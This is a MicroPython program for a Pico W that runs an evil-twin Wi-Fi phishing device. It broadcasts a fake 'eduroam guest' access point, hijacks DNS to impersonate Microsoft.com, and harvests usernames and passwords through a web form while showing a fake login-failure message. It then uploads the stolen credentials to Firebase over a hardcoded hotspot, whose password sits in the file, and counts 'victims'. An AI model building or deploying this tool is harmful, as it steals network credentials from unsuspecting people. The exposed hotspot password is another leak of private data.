from phew import access_point, connect_to_wifi, is_connected_to_wifi, dns, server
from phew.template import render_template
import json
import machine
import os
import utime
import _thread
import network
from reset_wifi import reset_wifi # Disables/resets all WiFi interfaces
from send_data import upload_wifi_data # Sends credentials to a backend
from victim_counter import *
import sys
import safety

# Pins mapping

LED_R = Pin(6, Pin.OUT) # Capture mode / setup mode
LED_B = Pin(9, Pin.OUT) # Transmission mode / AP mode
LED_W = Pin(4, Pin.OUT)

LED_R.off()
LED_B.off()
LED_W.off()

BUTTON = Pin(13, Pin.IN, Pin.PULL_UP) # Emergency stop button

HC_TRIGGER = Pin(15, Pin.OUT)
HC_ECHO = Pin(14, Pin.IN)

AP_NAME = "eduroam guest"
AP_DOMAIN = "Microsoft.com"
AP_TEMPLATE_PATH = "ap_templates"
WIFI_FILE = "wifi.json"
WIFI_MAX_ATTEMPTS = 3
user_WIFI = "iphone_xr"
PASSWORD_WIFI = "C-982927"

# Led functions

def activity_light():
    """Makes the white led blink to indicate activity"""
    LED_W.off()
    time.sleep(0.01)
    LED_W.on()


# Wifi stuff

def machine_reset():
    """Reboots the Pico W"""
    utime.sleep(1)
    activity_light()
    print("Resetting...")
    machine.reset()
    activity_light()

def setup_mode():
    """Activates the captive portal mode:
    - Starts an Access Point named "eduroam guest" ;
    - Serves HTML templates from "./ap_templates/" ;
    - Captures DNS requests to force browser redirection ;
    - Collects Wi-Fi credentials through a web form."""
    LED_R.on()
    print("Entering setup mode...")
    activity_light()
    
    def serve_static(request, path):
        activity_light()
        """Serves static files (CSS, images)"""
        print(f"chemin d'acces : assets/{path}")
        return server.serve_file(f"assets/{path}")

    server.add_route("/assets/<path>", handler=serve_static, methods=["GET"])
    activity_light()

    def ap_index(request):
        """Servers the homepage /"""
        activity_light()
        if request.headers.get("host").lower() != AP_DOMAIN.lower():
            return render_template(f"{AP_TEMPLATE_PATH}/redirect.html", domain = AP_DOMAIN.lower())
        return render_template(f"{AP_TEMPLATE_PATH}/index.html")

    def configure_wifi(request):
        """Handles WiFi credentials submitted through the form"""
        activity_light()
        user = request.form.get('inp_uname')
        password = request.form.get('inp_pwd')

        if not user or not password:
            missing_fields = []
            if not user:
                missing_fields.append('user')
            if not password:
                missing_fields.append('password')
            return f"Missing field(s): {', '.join(missing_fields)}", 400

        print(f"Received user: {user}, Password: {password}")

        with open(WIFI_FILE, 'w') as f:
            activity_light()
            json.dump({'user': user, 'password': password}, f) # Store credentials directly in wifi.json

        # Reboot device after sending response
        _thread.start_new_thread(machine_reset, ())
        activity_light()
        
        LED_R.off()
        return "We couldn’t sign you in. Please check your credentials and try again.", 200
    

    # Route unique

    # Add the corresponding routes to your server

    def ap_catch_all(request):
        """Catch-all route for redirection"""
        activity_light()
        if request.headers.get("host") != AP_DOMAIN:
            return render_template(f"{AP_TEMPLATE_PATH}/redirect.html", domain = AP_DOMAIN)
        return "Not found.", 404
    
    # Serve the static files

    server.add_route("/configure_wifi", handler=configure_wifi, methods=["POST"])
    server.add_route("/", handler=ap_index, methods=["GET"])
    # server.add_route("/configure", handler=ap_configure, methods=["POST"])
    server.set_callback(ap_catch_all)

    # Setting up the Access Point and DNS hijack
    ap = access_point(AP_NAME)
    ip = ap.ifconfig()[0]
    dns.run_catchall(ip)


# Main program

# Démarre soit en mode application, soit setup
try:
    # Checks if wifi.json file already exists
    reset_wifi()
    activity_light()
    print("Starting in application mode...")
    LED_B.on()
    os.stat(WIFI_FILE)
    activity_light()
    print("File exists, loading wifi credentials...")

    # wifi.json exists, the code continues from here
    with open(WIFI_FILE,"r") as f:
        activity_light()
        # Reading credentials from the file
        print("Credentials loaded")
        wifi_current_attempt = 1
        wifi_credentials = json.load(f)
        activity_light()
        print(wifi_credentials)
        
        # Tries to connect to a predefined WiFi connection "user_WIFI"
        while wifi_current_attempt <= WIFI_MAX_ATTEMPTS:
            print(f"Attempt {wifi_current_attempt} to connect to wifi...")
            activity_light()
            user = wifi_credentials["user"]
            PASSWORD = wifi_credentials["password"]

            print(f"Connecting to {user_WIFI} with password {PASSWORD_WIFI}")
            ip_address = connect_to_wifi(user_WIFI, PASSWORD_WIFI)
            activity_light()

            if ip_address is not None and is_connected_to_wifi():
                print(f"✅ Connected to wifi, IP address {ip_address}")
                activity_light()
                break  # Exit the loop on success

            print("❌ Failed to connect on this attempt.")
            wifi_current_attempt += 1
            activity_light()
            utime.sleep(1)  # Optional delay between attempts


        # If successfully connected to "user_WIFI", then sends the captured credentials to Firebase
        if is_connected_to_wifi():
            # application_mode()
            print("Connected to wifi, IP address", ip_address)
            activity_light()
            upload_wifi_data(user, PASSWORD)
            activity_light()
            print("Credentials uploaded to Firebase")
            
            display_victims_count_once()
        else:
            print("Bad wifi connection!")
    
    # Cleaning the leftovers
    LED_B.off()
    reset_wifi()
    activity_light()
    utime.sleep(1)
    print("🔁 Restarting device...")
    activity_light()
    os.remove(WIFI_FILE)
    activity_light()
    machine_reset()

# If any error occurs, cleans the Wifi state and lanches the captive portal for setup.
except Exception:
    LED_B.off()
    print("⚠️ Could not connect to Wi-Fi. Switching to setup mode...")
    LED_R.on()
    activity_light()
    # ❗ Désactive AP mode s'il est actif
    reset_wifi()
    activity_light()
    setup_mode()
    activity_light()
    # ✅ Lance le serveur
    print("Starting server...")
    activity_light()
    # _thread.start_new_thread(safety.shutdown_watchdog, ())  This line cannot be implemented due to hardware limitations: Insufficient amount of cores.
    activity_light()
    while(True):
        server.run()

# Diagnostics
print("Racine :", os.listdir())
print("ap_templates :", os.listdir("ap_templates"))
print("assets :", os.listdir("assets"))
stats = os.statvfs("/")
print("Espace libre :", stats[0] * stats[3] // 1024, "Ko")
